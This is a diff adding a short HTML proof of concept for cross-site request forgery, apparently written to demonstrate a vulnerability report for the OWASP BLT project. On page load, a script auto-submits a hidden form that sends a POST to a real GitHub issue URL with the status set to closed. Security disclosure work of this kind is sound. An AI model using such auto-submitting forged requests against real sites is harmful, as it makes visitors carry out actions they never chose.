@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF POC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form id="csrfForm" action="https://github.com/OWASP-BLT/BLT/issues/4049" method="POST">
+        <input type="hidden" name="status" value="closed">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
